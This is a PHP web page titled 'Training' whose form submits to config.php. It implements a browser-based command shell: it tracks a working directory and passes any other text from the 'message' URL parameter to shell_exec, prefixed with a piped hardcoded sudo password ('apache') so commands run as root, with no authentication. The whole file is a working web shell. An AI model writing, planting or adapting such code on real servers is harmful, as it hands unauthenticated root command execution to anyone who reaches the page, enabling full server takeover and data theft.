<!DOCTYPE html>
<html>
<head>
<script type="text/javascript">
function enter() {
  if( window.event.keyCode == 13 ) {
    document.form.submit();
  }
}
</script>
<link rel="stylesheet" href="test.css">
<meta charset='utf-8'>
<title> Training </title>
</head>
<h1>
Connection: 
<?php
include('./header.php');
echo $address;
?>
</h1>
<body>
<?php
$current_dir = "/";
if($_GET['dir']) {
  $current_dir = htmlspecialchars($_GET['dir']);
}
$acception = FALSE;
if($_GET['message']) {
  if(substr(htmlspecialchars($_GET['message']),0,3) == "cd ") {
    $new_dir = substr(htmlspecialchars($_GET['message']),3);
    if(substr($new_dir,0,1) == " ") {
      while(substr($new_dir,0,1) == " ") {
        $new_dir = substr($new_dir,1);
      }
    }
    if(substr($new_dir,0,1) == "/" or substr($new_dir,0,1) == "~") {
      if(chdir($new_dir)){
        $current_dir = $new_dir;
        $acception = TRUE;
      }
      else {
        $acception = FALSE;
      }
    }
    else {
      if(substr($new_dir,0,2) == "./") {
        $new_dir = substr($new_dir,2);
      }
      if(substr($new_dir,0,3) == "../") {
        while (substr($new_dir,0,3) == "../") {
          $removing = array_reverse(explode("/", $current_dir))[1];
          $num = -(strlen($removing) + 1);
          $current_dir = substr($current_dir,0,$num);
          $new_dir = substr($new_dir,3);
        }
      }
      if(chdir("$current_dir$new_dir")) {
        $current_dir = "$current_dir$new_dir";
        $acception = TRUE;
      }
      else {
        $acception = FALSE;
      }
    }
    if(substr($current_dir,-1) != "/") {
      $current_dir = "$current_dir/";
    }
  }
}
echo "<hr>".$current_dir."<hr>";
?>
<form name="form" action="config.php" method="get">
  <label class="directorybox">
    <input type="hidden" name="dir" value="<?php echo $current_dir; ?>">
  </label>
  <label class="textbox">
    <input type="text" name="message" style="border:none;color:white;width:100%" autofocus autocomplete=off onkeypress="enter();">
  </label>
</form>
<?php
if($_GET['message']) {
  $result = "";
  if(substr(htmlspecialchars($_GET['message']),0,2) == "cd") {
    if($acception == FALSE) {
      $result = "No such file or directory.";
    }
  }
  else {
    chdir($current_dir);
    $cmd = "echo apache | sudo -S ".htmlspecialchars($_GET['message']);
    $result = shell_exec($cmd);
  }
  echo "<pre>".htmlspecialchars($result)."<pre>";
}
?>
</body>
</html>

